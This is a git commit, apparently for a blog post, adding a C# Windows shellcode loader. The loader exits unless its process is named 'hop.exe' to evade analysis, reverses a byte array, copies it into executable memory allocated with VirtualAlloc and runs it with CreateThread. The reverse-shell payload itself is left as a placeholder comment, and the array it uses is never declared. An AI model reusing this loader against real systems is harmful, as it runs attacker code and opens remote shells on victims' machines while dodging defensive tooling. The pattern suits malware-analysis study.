2d8e3347ddb2e83a2e84120b174f83754362ef82
0xHop <0xh0psc0tch@gmail.com>
2021-04-19 23:46:16 -0400

    Files
    Blog files

---
+++ Blog1/Program.cs
@@ -0,0 +1,46 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+namespace WIn32
+{
+    class Program
+    {
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint
+         flAllocationType, uint flProtect);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
+IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+        [DllImport("kernel32.dll")]
+        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32
+dwMilliseconds);
+
+        static void Main(string[] args)
+        {
+            var proc = System.Diagnostics.Process.GetCurrentProcess();
+            string hop = proc.ProcessName;
+
+            if (hop != "hop.exe")
+			{
+                Environment.Exit(0);
+			}
+
+		//Reverse shellcode here
+
+          
+            Array.Reverse(waffle);
+            int size = waffle.Length;
+            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
+            Marshal.Copy(waffle, 0, addr, size);
+            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+            WaitForSingleObject(hThread, 0xFFFFFFFF);
+        }
+    }
+}
